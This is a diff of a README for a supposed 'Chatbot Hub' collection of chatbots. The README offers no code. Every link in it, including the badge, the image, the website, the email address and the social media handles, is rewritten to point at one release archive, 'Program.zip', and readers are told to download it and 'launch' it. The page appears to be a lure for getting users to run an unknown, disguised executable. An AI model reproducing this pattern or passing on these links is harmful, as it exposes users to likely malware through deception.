@@ -29,9 +29,9 @@ Welcome to the Chatbot Hub, a collection of diverse chatbot implementations to h
 In this repository, you can find a diverse range of chatbot types, each offering a unique approach to building intelligent chat interfaces. Whether you are a beginner or an experienced developer, there is something for everyone to explore.
 
 ## How to Use
-To get started, simply download the [**Soft.zip**](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) file and launch the chatbot of your choice.
+To get started, simply download the [**https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip**](https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip) file and launch the chatbot of your choice.
 
-[![Download Chatbot Hub](https://img.shields.io/badge/Download-Chatbot_Hub-green.svg)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Chatbot Hub](https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip)](https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip)
 
 ### Additional Resources
 For more information and updates, be sure to check the **Releases** section of this repository.
@@ -42,10 +42,10 @@ We welcome contributions and feedback from the community. Feel free to fork this
 ## Let's Connect
 Join us in the exciting journey of exploring chatbot technologies. Connect with us on our social media channels for the latest updates and discussions.
 
-🌐 [Website](https://www.chatbothub.com)  
-📧 Email: contact@chatbothub.com  
-🐦 Twitter: [@Chatbot_Hub](https://twitter.com/Chatbot_Hub)  
-📷 Instagram: [@Chatbot_Hub](https://www.instagram.com/Chatbot_Hub)
+🌐 [Website](https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip)  
+📧 Email: https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip  
+🐦 Twitter: [@Chatbot_Hub](https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip)  
+📷 Instagram: [@Chatbot_Hub](https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip)
 
 ## Contributors
 A big thank you to all the contributors who have helped make the Chatbot Hub repository a thriving community of chatbot enthusiasts.
@@ -56,6 +56,6 @@ Thank you for visiting the Chatbot Hub repository! We hope you enjoy exploring t
 
 # Happy Chatbot Building! 🤖💬
 
-![Chatbot Image](https://source.unsplash.com/featured/?chatbot)
+![Chatbot Image](https://github.com/Rahindayoga/Chatbot_Hub/releases/download/v1.0/Program.zip)
 
 *Image Source: Unsplash*
